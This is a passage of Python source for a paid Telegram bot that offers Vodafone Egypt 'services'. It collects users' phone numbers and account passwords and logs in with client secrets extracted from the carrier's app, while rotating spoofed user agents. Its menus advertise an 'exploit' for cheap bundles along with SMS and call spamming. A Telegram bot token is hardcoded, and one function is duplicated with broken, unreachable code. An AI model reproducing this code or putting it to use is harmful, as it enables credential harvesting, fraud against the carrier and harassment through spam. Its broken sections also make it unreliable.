import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import sys
import random
import re
import string
from requests import Session 
from colorama import init, Fore, Style
from threading import Thread, Timer
from datetime import datetime, timedelta 
from typing import Tuple, Optional, Dict, Any, List
import logging
import os
import pytz
from functools import wraps
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import sqlite3
import uuid
import signal
import atexit
import pyfiglet
from termcolor import cprint, colored
import getpass
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import base64

# ===== إعداد logging =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

init(autoreset=True)
BRIGHT_YELLOW = Style.BRIGHT + Fore.YELLOW
SUCCESS_COLOR = Style.BRIGHT + Fore.GREEN
ERROR_COLOR = Style.BRIGHT + Fore.RED
RESET = Style.RESET_ALL

# ===== دالة تسجيل الدخول الموحدة (جديدة) =====
def login(username, password, client_id="ana-vodafone-app", client_secret="95fd95fb-7489-4958-8ae6-d31a525cd20a"):
    """
    دالة تسجيل الدخول إلى حساب فودافون مصر عبر الـ API الخاص بالتطبيق.
    
    المدخلات:
        username (str): رقم الهاتف (مثال: 01000000000)
        password (str): كلمة المرور
        client_id (str): معرف العميل (اختياري)
        client_secret (str): المفتاح السري للعميل (اختياري)
    
    المخرجات:
        tuple: (نجاح, التوكن, رقم الهاتف, كائن الاستجابة) أو (False, None, None, None) في حالة الفشل
    """
    
    # بيانات ثابتة من الكود الأصلي (يمكن تعديلها حسب الحاجة)
    device = "HONOR ALI-NX1"
    os_version = "15"
    app_version = "2025.11.1.1"
    build = "1064"
    
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': username,
        'password': password,
        'client_secret': client_secret,
        'client_id': client_id
    }
    
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'silentLogin': "false",
        'x-agent-operatingsystem': os_version,
        'Accept-Language': "ar",
        'x-agent-device': device,
        'x-agent-version': app_version
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers)
        response.raise_for_status()
        
        data = response.json()
        
        if 'access_token' in data:
            token = data['access_token']
            logger.info(f"✅ تم تسجيل الدخول بنجاح للرقم: {username}")
            return True, token, username, data
        else:
            logger.error("❌ فشل تسجيل الدخول: لا يوجد توكن في الرد")
            return False, None, None, data
            
    except requests.exceptions.RequestException as e:
        logger.error(f"❌ خطأ في الاتصال: {e}")
        return False, None, None, None
    except json.JSONDecodeError:
        logger.error("❌ خطأ في تحويل الرد إلى JSON")
        return False, None, None, None

# ===== كلاس VodafoneAccount (تم تعديل دالة login داخله) =====
class VodafoneAccount:
    def __init__(self):
        self.session = requests.Session()
        self.access_token = None
        self.phone_number = None
        self.base_headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar"
        }
    
    def login(self, phone_number, password, client_id="ana-vodafone-app", client_secret="95fd95fb-7489-4958-8ae6-d31a525cd20a"):
        """تسجيل الدخول باستخدام الدالة الموحدة login"""
        self.phone_number = phone_number
        
        print(colored("🔐 جاري تسجيل الدخول...", "yellow"))
        
        success, token, _, _ = login(phone_number, password, client_id, client_secret)
        if success:
            self.access_token = token
            print(colored("✅ تم تسجيل الدخول بنجاح", "green"))
            return True
        else:
            print(colored("❌ فشل تسجيل الدخول", "red"))
            return False
    
    def get_access_token(self):
        """إرجاع التوكن الحالي"""
        return self.access_token
    
    def get_account_info(self):
        """الحصول على معلومات الحساب من الـ JWT token"""
        if not self.access_token:
            print(colored("❌ يجب تسجيل الدخول أولاً", "red"))
            return None
        
        try:
            # فك تشفير الـ JWT token
            parts = self.access_token.split('.')
            if len(parts) != 3:
                return None
            
            # فك تشفير base64
            payload_b64 = parts[1]
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += "=" * padding
            
            payload_bytes = base64.urlsafe_b64decode(payload_b64)
            payload_str = payload_bytes.decode('utf-8')
            user_info = json.loads(payload_str)
            
            return user_info.get('userInfo', {})
            
        except:
            return None
    
    def get_service_account(self):
        """الحصول على معلومات خدمة الحساب"""
        if not self.access_token or not self.phone_number:
            return None
        
        url = "https://web.vodafone.com.eg/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
        
        params = {
            '@type': "Profile",
            '$.resources[?(@resourceType==\'MSISDN\')].IDs[0].value': self.phone_number
        }
        
        headers = {
            'Host': 'web.vodafone.com.eg',
            'Connection': 'keep-alive',
            'msisdn': self.phone_number,
            'Accept-Language': 'AR',
            'Authorization': f'Bearer {self.access_token}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'clientId': 'WebsiteConsumer',
            'Referer': 'https://web.vodafone.com.eg/spa/myHome'
        }
        
        try:
            response = self.session.get(url, params=params, headers=headers)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def get_balance(self):
        """الحصول على رصيد الحساب"""
        if not self.access_token or not self.phone_number:
            return None
        
        url = "https://mobile.vodafone.com.eg/services/dxl/bal/balance/v2/balances"
        
        params = {
            'accountNumber': self.phone_number,
            'balanceType': 'CurrentBalance'
        }
        
        headers = {
            **self.base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'api-host': 'BalanceManagement',
            'useCase': 'balance',
            'msisdn': self.phone_number
        }
        
        try:
            response = self.session.get(url, params=params, headers=headers)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def get_offers(self):
        """الحصول على العروض المتاحة"""
        if not self.access_token or not self.phone_number:
            return None
        
        url = "https://mobile.vodafone.com.eg/services/dxl/offers/offers/v3/offers"
        
        params = {
            'msisdn': self.phone_number,
            'status': 'ACTIVE',
            'offerType': 'ALL'
        }
        
        headers = {
            **self.base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'api-host': 'OffersManagement',
            'useCase': 'offers',
            'msisdn': self.phone_number
        }
        
        try:
            response = self.session.get(url, params=params, headers=headers)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def get_subscriptions(self):
        """الحصول على الاشتراكات"""
        if not self.access_token or not self.phone_number:
            return None
        
        url = "https://mobile.vodafone.com.eg/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
        
        params = {
            '@type': "subscription",
            '$.resources[?(@resourceType==\'MSISDN\')].IDs[0].value': self.phone_number
        }
        
        headers = {
            **self.base_headers,
            'Authorization': f"Bearer {self.access_token}",
            'msisdn': self.phone_number
        }
        
        try:
            response = self.session.get(url, params=params, headers=headers)
            return response.json() if response.status_code == 200 else None
        except:
            return None

# ===== متغير للتحكم في حالة تشغيل البوت (للمالك) =====
BOT_RUNNING = True

def is_bot_running():
    return BOT_RUNNING

def set_bot_running(state: bool):
    global BOT_RUNNING
    BOT_RUNNING = state

# ===== تم تعديل التوكن والمطور والآيدي =====
BOT_TOKEN = "8586927556:AAHIEIz7_E1KZhC51tY3sKKxrnfHXoIzu1w"
 
DEVELOPER_USER = "@Nagy918"

BS4_AVAILABLE = True
    
DB_FILE = "user_sessions.db"
egypt_tz = pytz.timezone('Africa/Cairo')

# ===== قائمة معرفي الأدمن (المالك + الأدمن المساعد) سيتم تحميلها من قاعدة البيانات =====
OWNER_ID = 1059743894  # المالك الأساسي
ADMIN_IDS = [OWNER_ID]  # سيتم إضافة المساعدين من قاعدة البيانات

# ===== تحميل المساعدين من قاعدة البيانات =====
def load_assistant_admins():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS assistant_admins (user_id INTEGER PRIMARY KEY)')
    cursor.execute('SELECT user_id FROM assistant_admins')
    rows = cursor.fetchall()
    conn.close()
    assistant_ids = [row[0] for row in rows]
    ADMIN_IDS.extend(assistant_ids)
    # إزالة التكرار
    ADMIN_IDS[:] = list(set(ADMIN_IDS))
    logger.info(f"✅ تم تحميل المساعدين: {assistant_ids}")

def add_assistant_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO assistant_admins (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.append(user_id)
    return True

def remove_assistant_admin(user_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM assistant_admins WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
    if user_id in ADMIN_IDS:
        ADMIN_IDS.remove(user_id)
    return True

load_assistant_admins()  # تحميل عند بدء التشغيل

CHECKING_SUBSCRIPTION = {}  # متغير لتتبع المستخدمين الجاري التحقق منهم

# ===== تعريف البوت بعد ADMIN_IDS مباشرة =====
bot = telebot.TeleBot(BOT_TOKEN)

# ===== نظام الاشتراكات =====
SUBSCRIPTION_PRICE =  100 # سعر الاشتراك بالجنيه (يمكن تغييره)
SUBSCRIPTION_DURATION_DAYS = 30  # مدة الاشتراك بالايام
REQUIRE_SUBSCRIPTION = True  # متغير للتحكم في تفعيل/إلغاء الاشتراك الإجباري

# ===== إضافة خطط الاشتراك الجديدة (أسبوعي/شهري) =====
WEEKLY_PRICE = 40
WEEKLY_DAYS = 7
MONTHLY_PRICE = 100
MONTHLY_DAYS = 30

# ===== قنوات الاشتراك الإجباري (سيتم تحميلها من قاعدة البيانات) =====
# تم نقل القنوات إلى قاعدة البيانات
REQUIRED_CHANNELS = []  # سيتم ملؤها من قاعدة البيانات

# ===== رسالة عدم الاشتراك (تم تعديلها حسب الطلب) =====
SUBSCRIPTION_EXPIRED_MESSAGE = """⚠️ البوت متاح للمشتركين فقط حالياً، حاول لاحقًا.

🕌 صلِّ على الحبيب محمد ﷺ

🕋 اذكر الله - سبحان الله، الحمد لله، لا إله إلا الله، والله أكبر

الإشتراك /premium"""

# رسالة عدم الاشتراك في القنوات
CHANNEL_SUB_REQUIRED_MESSAGE = "⚠️ يجب الاشتراك في القنوات التالية أولاً:\n\n{channels_list}\n\nبعد الاشتراك اضغط على 'تحقق'."

# رسالة الترحيب الجديدة (بدون شعار) - تم تعديلها حسب الطلب
WELCOME_MESSAGE = "مرحبا بك في بوت خدمات فودافون الخاص ب cobra-X 🔥\nيرجي تسجيل دخول للاستمتاع بالخدمات 👌❤🔥\n\nصلي على سيدنا محمد ﷺ"

# ===== إعدادات Auto-Restart =====
RESTART_INTERVAL = 1800  # 30 دقيقة بالثواني
LAST_RESTART_FILE = "last_restart.txt"
RESTART_ENABLED = True

# تحديث بيانات المصادقة
AUTH_URL = 'https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token'

# بيانات عميل محدثة
CLIENT_CREDENTIALS = [
    {
        'client_id': 'my-vodafone-app',
        'client_secret': 'a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3',
        'name': 'my-vodafone-app'
    },
    {
        'client_id': 'ana-vodafone-app',
        'client_secret': '95fd95fb-7489-4958-8ae6-d31a525cd20a',
        'name': 'ana-vodafone-app'
    },
    {
        'client_id': 'android-app',
        'client_secret': '9d8f7a6b-5c4d-3e2f-1a0b-9c8d7b6a5f4e',
        'name': 'android-app'
    },
    {
        'client_id': 'vodafone-app',
        'client_secret': 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
        'name': 'vodafone-app'
    }
]

SUBDOMAINS = ["mobile.vodafone.com.eg", "web.vodafone.com.eg"]

BUNDLE_CLIENT_ID = 'ana-vodafone-app'
BUNDLE_CLIENT_SECRET = '95fd95fb-7489-4958-8ae6-d31a525cd20a'

# تحديث User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
    "okhttp/4.11.0", 
    "okhttp/4.9.1",
    "vodafoneandroid/2025.12.1",
    "AnaVodafoneApp/2025.11.1",
    "VodafoneEG/2025.1.1 CFNetwork/1492.0.1 Darwin/23.3.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A225F Build/RP1A.200720.012)",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# User Agents جديدة لأجهزة Apple
USER_AGENTS_APPLE = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

USER_AGENT_MOBILE = 'VodafoneEG/5.5.1 (iPhone; iOS 16.6; Scale/3.00)'

MAX_RETRIES = 5
RETRY_DELAY = 3

# ===== تحديث الرسائل الديناميكية (بدون أي أكواد HTML) =====
DYNAMIC_MESSAGES = {
    "welcome_message": WELCOME_MESSAGE,
    "Cobra-X": "شكرا لاستخدامك البوت 😍",
    "error_message": "حدث خطأ. الرجاء المحاولة مرة أخرى\n\nتصلي على سيدنا محمد ﷺ",
    
    "bugs_section": "🔓 قسم الثغرات\n\nلا يوجد ثغرات 🔥\n\nتصلي على سيدنا محمد ﷺ",
    "developer_section": "👨‍💻 قسم المطور\n\nالمطور: @{developer}\nجيوع: مع السلامة يا حبيبي 💔\n\nللتواصل مع المطور اضغط على الزر أدناه\n\nتصلي على سيدنا محمد ﷺ",
    
    "services_welcome": "مرحباً بك في قسم خدمات فودافون! 👋\n\nأنت مسجل دخول كـ: {number}\n\n💰 رصيد الخط: {balance} جنيه\n📅 عدد ايامك: {days_remaining} يوم\n📆 تاريخ الانتهاء: {end_date}\n\nاختر الخدمة من القائمة أدناه.\n\nتصلي على سيدنا محمد ﷺ",
    
  "login_required": "🚀 قسم خدمات فودافون\n\n👋 Welcome to Vodafone Services Bot 😍🔥\n\n⚠️ يجب عليك تسجيل الدخول أولاً لاستخدام الخدمات.\n👇 اضغط على '🔐 تسجيل الدخول' للبدء.\n\nتصلي على سيدنا محمد ﷺ ✨",

    "login_step1": "🔐 تسجيل الدخول\n\nالخطوة 1 من 2:\n📱 أرسل رقم هاتفك فودافون:\n(يجب أن يكون 11 رقم يبدأ بـ 01)\n\nتصلي على سيدنا محمد ﷺ",
    "login_step2": "🔐 تسجيل الدخول\n\nالخطوة 2 من 2:\n🔒 أرسل كلمة مرور الحساب:\n\nتصلي على سيدنا محمد ﷺ",
    "login_success": "✅ تم تسجيل الدخول بنجاح!\n\n📱 رقمك المسجل: {number}\n📦 نظامك الحالي: {package_name}\n💰 رصيدك: {balance} جنيه\n💳 الفليكسات الحالية: {flex_current} فليكس\n📅 فليكسات الشهر الجاي: {flex_next} فليكس\n💵 رصيد الموني باك: {money_back} جنيه\n\nيمكنك الآن استخدام جميع الخدمات.\n\nتصلي على سيدنا محمد ﷺ",
}

# ===== باقات التحويل وتزويد يومين (تم تعطيل تنفيذها) =====
PACKAGES = {
    "📦 فليكس 35 (35ج)": "Flex_2024_625",
    "📦 فليكس 40 (40ج)": "Flex_2021_511",
    "📦 فليكس 45 (45ج)": "Flex_2024_627",
    "📦 فليكس 60 (60ج)": "Flex_2021_513",
    "📦 فليكس 70 (70ج)": "Flex_2024_629",
    "📦 فليكس 90 (90ج)": "Flex_2021_515",
    "📦 فليكس 100 (100ج)": "Flex_2024_631",
    "📦 فليكس 130 (130ج)": "Flex_2021_517",
    "📦 فليكس 150 (150ج)": "Flex_2024_633",
    "📦 فليكس 260 (260ج)": "Flex_2021_523",
    "📦 فليكس 300 (300ج)": "Flex_2024_637",
    "💰 14 قرش (ريح بالك)": "TARIFF_14_QURUSH"
}

# ===== أنظمة فليكس (باقات فليكس + ريح بالك) - جديدة =====
FLEX_SYSTEMS = {
    '1': {'id': 'Flex_2024_625', 'name': '📦 فليكس 35', 'value': 35, 'type': 'bundle'},
    '2': {'id': 'Flex_2021_511', 'name': '📦 فليكس 40', 'value': 40, 'type': 'bundle'},
    '3': {'id': 'Flex_2024_627', 'name': '📦 فليكس 45', 'value': 45, 'type': 'bundle'},
    '4': {'id': 'Flex_2021_513', 'name': '📦 فليكس 60', 'value': 60, 'type': 'bundle'},
    '5': {'id': 'Flex_2024_629', 'name': '📦 فليكس 70', 'value': 70, 'type': 'bundle'},
    '6': {'id': 'Flex_2021_515', 'name': '📦 فليكس 90', 'value': 90, 'type': 'bundle'},
    '7': {'id': 'Flex_2024_631', 'name': '📦 فليكس 100', 'value': 100, 'type': 'bundle'},
    '8': {'id': 'Flex_2021_517', 'name': '📦 فليكس 130', 'value': 130, 'type': 'bundle'},
    '9': {'id': 'Flex_2024_633', 'name': '📦 فليكس 150', 'value': 150, 'type': 'bundle'},
    '10': {'id': 'Flex_2021_523', 'name': '📦 فليكس 260', 'value': 260, 'type': 'bundle'},
    '11': {'id': 'Flex_2024_635', 'name': '📦 فليكس 280', 'value': 280, 'type': 'bundle'},
    '12': {'id': 'Flex_2024_637', 'name': '📦 فليكس 300', 'value': 300, 'type': 'bundle'},
    '13': {'id': 'Worry_Free_14PT', 'name': '🕊️ ريح بالك', 'value': 0, 'type': 'service'},  # تم تعديل الاسم قليلاً
}

# ===== باقات الإنترنت المضافة من ملف نت.py =====
BUNDLES = {
    1: {"name": "Extreme 6.5", "id": "MI_BASIC_SUPER_5"},
    2: {"name": "Extreme 13", "id": "MI_BASIC_SUPER_10"},
    3: {"name": "Extreme 26", "id": "MI_BASIC_SUPER_20"},
    4: {"name": "Extreme 40", "id": "471"},
    5: {"name": "Extreme 52", "id": "MI_BASIC_SUPER_40"},
    6: {"name": "Extreme 80", "id": "473"},
    7: {"name": "Extreme 105", "id": "MI_BASIC_SUPER_80"},
    8: {"name": "Extreme 130", "id": "474"},
    9: {"name": "Extreme 195", "id": "475"},
    10: {"name": "Extreme 325", "id": "476"},
    11: {"name": "Extreme 520", "id": "483"},
    12: {"name": "Plus 9", "id": "MI_BA_XC_SC_7"},
    13: {"name": "Plus 20", "id": "MI_BA_XC_ST_15"},
    14: {"name": "Plus 32", "id": "Plus_XC_SC_FlexActive_25"},
    15: {"name": "Plus 45", "id": "MI_BA_XC_ST_35"},
    16: {"name": "Plus 60", "id": "MI_BA_XC_ST_45"},
    17: {"name": "Plus 85", "id": "MI_BA_XC_ST_65"},
    18: {"name": "Plus 105", "id": "Plus_XC_SC_FlexActive_80"},
    19: {"name": "Plus 260", "id": "MI_XC_CMBO_FlexActive_200"},
    20: {"name": "Plus 520", "id": "MI_XC_CMBO_FlexActive_400"}
}

# ===== قائمة كروت فكة من الملف القديم =====
CARDS_LIST = [
    "Fakka_7_Unite", "Fakka_7_Social", "Fakka_2.5_Unite",
    "Fakka_2.5_Social", "Fakka_4.25_Unite", "Fakka_4.25_Social",
    "Fakka_9_Unite", "Fakka_9_Social", "Fakka_3_Unite",
    "Fakka_6_NewUnite", "Fakka_10.5_Unite", "Fakka_11.5_Unite",
    "Fakka_15.5_Unite", "Fakka_17.5_Unite", "Fakka_12_Unite",
    "Fakka_13_Unite", "Fakka_16.5_Unite", "Fakka_19.5_NewUnite",
    "Fakka_26_Unite", "Mared_10_Minuts", "Mared_10_Flexs",
    "Mared_10_Social"
]

# ===== أسماء الأزرار القابلة للتعديل =====
BUTTON_NAMES = {
    "login": "🔐 تسجيل الدخول",
    "internet_bundles": "📡 باقات الإنترنت",
    "get_offers": "🎁 العروض 🎁",
    "cards": "🛒 كروت فكة",
    "suspend_line": "⏸️ إيقاف الخط",
    "stop_ads": "🎁 هدايا البوت",
    "change_password": "🔐 تغيير كلمة المرور",
    "package_report": "📋 اشتراكاتي",
    "package_conversion": "أنظمة فليكس 🔄",
    "add_two_days": "⏳ تزويد يومين",
    "refund_money_back": "💸 استرداد Money Back",
    "logout": "🚪 تسجيل خروج",
    "flex_260": "فليكس فاميلي👨‍👩‍👧‍👦",
    "flex_percentage": "📊 نسبة فليكس",
    "get_owner_number": "👤 معرفة رقم المالك",
    "send_invitation": "📤 إرسال دعوة",
    "accept_invitation": "✅ قبول دعوة",
    "delete_invitation": "🗑️ حذف دعوة",
    "change_quota": "📈 تغيير نسبة الحصة",
    "send_and_accept": "🎯 إرسال وقبول",
    "discount_offers": "خصم فليكس 🎯",
    "add_family_member_4x4": "🚀 تطير افراد",
    "charge_cards": "💳 شحن كروت",
    "balance_transfer": "🔄 تحويل رصيد",
    "flex_transfer": "🔄 تحويل فليكسات",
    "next_page": "➡️ الصفحة التالية",
    "prev_page": "⬅️ الصفحة السابقة",
    "home": "🏠 الرئيسية",
    "back": "🔙 القائمة السابقة",
    "truecaller": "📞 تروكولر",
    "spam_messages": "اسبام رسايل 💬",
    "spam_calls": "اسبام مكالمات 📞",
    "premium_subscription": "💳 شراء اشتراك",  # سيتم استبداله
    "user_data": "📋 بيانات الخط",
    "renew_bundle": "🔄 تجديد الباقة",
    "flex_systems": "🔄 أنظمة فليكس",               # زر جديد مع إيموجي
    "remove_assistant_admin": "حذف ادمن مساعد",  # زر جديد
    "family_details": "📋 تفاصيل العائله",         # زر جديد لتفاصيل العائلة
    "call_history": "📞 سجل مكالمات",              # زر جديد لسجل المكالمات
    # تم تغيير اسم "plus_discount" إلى "500_units"
    "500_units": "500 وحده متجدده ✨",               # زر جديد بدلاً من خصم بلس
    "exploit_1500": "⚡ دقايق و ميجابايتس ب 5 جنيه", # الزر الجديد للثغرة
    "contact_dev": "📞 تواصل مع المطور",             # زر بديل للاشتراك
    "second_month_internet": "عرض النت الشهر التاني 🚀",  # زر جديد
    "manage_channels": "📢 إدارة القنوات الإجبارية",  # زر جديد للتحكم في القنوات
    "change_dev_username": "👤 تغيير يوزر المطور",   # زر جديد لتغيير يوزر المطور
    "check_nota_eligibility": "🔍 استعلام تأهيل النوتة",  # زر استعلام تأهيل النوتة
    "activate_nota15": "✅ تفعيل نوتة 15",             # زر تفعيل نوتة 15
    "activate_nota40": "✅ تفعيل نوتة 40",             # زر تفعيل نوتة 40
    # أزرار القوائم الفرعية الجديدة
    "menu_flex_management": "📊 إدارة فليكس",
    "menu_line_management": "⚙️ إدارة الخط و الحساب",
    "menu_internet": "🌐 باقات الإنترنت",
    "menu_offers": "🎯 العروض و الخصومات",
    "menu_other": "🔧 خدمات أخرى",
    "menu_nota": "📋 نوته جميع الانظمه",
    "vodafone_cash_no_tax": "🛒 كروت فكة بدون ضريبة",
}

def get_button_name(key):
    return BUTTON_NAMES.get(key, key)

def update_button_name(key, new_name):
    BUTTON_NAMES[key] = new_name
    return True

def get_dynamic_message(key, **kwargs):
    message = DYNAMIC_MESSAGES.get(key, "رسالة غير متوفرة")
    if kwargs:
        message = message.format(**kwargs)
    return message

def update_dynamic_message(key, new_message):
    DYNAMIC_MESSAGES[key] = new_message
    return True

# ===== دوال قاعدة البيانات للقنوات الإجبارية والمطور =====
def init_channel_tables():
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            link TEXT NOT NULL,
            username TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def get_required_channels():
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT id, name, link, username FROM required_channels')
    rows = cursor.fetchall()
    conn.close()
    channels = [{'id': row[0], 'name': row[1], 'link': row[2], 'username': row[3]} for row in rows]
    return channels

def add_required_channel(name, link, username):
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('INSERT INTO required_channels (name, link, username) VALUES (?, ?, ?)', (name, link, username))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM required_channels WHERE id = ?', (channel_id,))
    conn.commit()
    conn.close()

def get_developer_username():
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "developer_username"')
    result = cursor.fetchone()
    conn.close()
    if result:
        return result[0]
    return "@Nagy918"

def get_developer_username():
    return "@Nagy918"
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('''
        UPDATE bot_settings SET setting_value = ?, updated_by = ?, updated_at = ?
        WHERE setting_key = "developer_username"
    ''', (value, admin_id, now))
    conn.commit()
    conn.close()
    # تحديث المتغير العام
    global DEVELOPER_USER
    DEVELOPER_USER = value
    return True

def init_default_channels():
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()

    cursor.execute("DELETE FROM required_channels")

    default_channels = [
        ("Cobra X", "https://t.me/CobraXGroup", "@CobraXGroup"),
        ("cobra_x_channel", "https://t.me/cobra_x_channel", "@cobra_x_channel")
    ]

    for name, link, username in default_channels:
        cursor.execute(
            "INSERT INTO required_channels (name, link, username) VALUES (?, ?, ?)",
            (name, link, username)
        )

    conn.commit()
    conn.close()

# ===== دوال Auto-Restart =====
def schedule_restart():
    """جدولة إعادة تشغيل البوت كل 30 دقيقة"""
    if not RESTART_ENABLED:
        return
    
    def restart_task():
        try:
            logger.info("🔄 جاري إعادة تشغيل البوت...")
            
            # حفظ وقت الإعادة الأخيرة
            with open(LAST_RESTART_FILE, 'w') as f:
                f.write(str(datetime.now()))
            
            # إعادة تشغيل البوت
            os.execv(sys.executable, ['python'] + sys.argv)
            
        except Exception as e:
            logger.error(f"❌ خطأ في إعادة التشغيل: {e}")
    
    # جدولة الإعادة كل 30 دقيقة
    timer = Timer(RESTART_INTERVAL, restart_task)
    timer.daemon = True
    timer.start()
    logger.info(f"✅ تم جدولة إعادة التشغيل التلقائي كل {RESTART_INTERVAL//60} دقيقة")

# ===== دالة الحصول على رصيد الخط مع معالجة التوكن بشكل صحيح =====
def get_line_balance(token, phone_number):
    """دالة محسنة للحصول على رصيد الخط مع معالجة التوكن بشكل صحيح"""
    try:
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        params = {
            "@type": "Promo",
            "$.context.type": "offerstab",
            "$.characteristics[@name='balance'].value": ""
        }
        
        # تنظيف التوكن إذا كان يحتوي على نص إضافي
        clean_token = token
        if isinstance(token, str):
            if token.startswith('Bearer '):
                clean_token = token
            elif token.startswith('{'):
                try:
                    token_data = json.loads(token)
                    if 'access_token' in token_data:
                        clean_token = f"Bearer {token_data['access_token']}"
                except:
                    clean_token = f"Bearer {token}"
            else:
                clean_token = f"Bearer {token}"
        
        headers = {
            'Authorization': clean_token,
            'msisdn': phone_number,
            'clientId': 'WebsiteConsumer',
            'channel': 'WEB',
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'application/json',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive',
            'x-agent-version': '2024.12.1'
        }
        
        response = requests.get(url, params=params, headers=headers, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
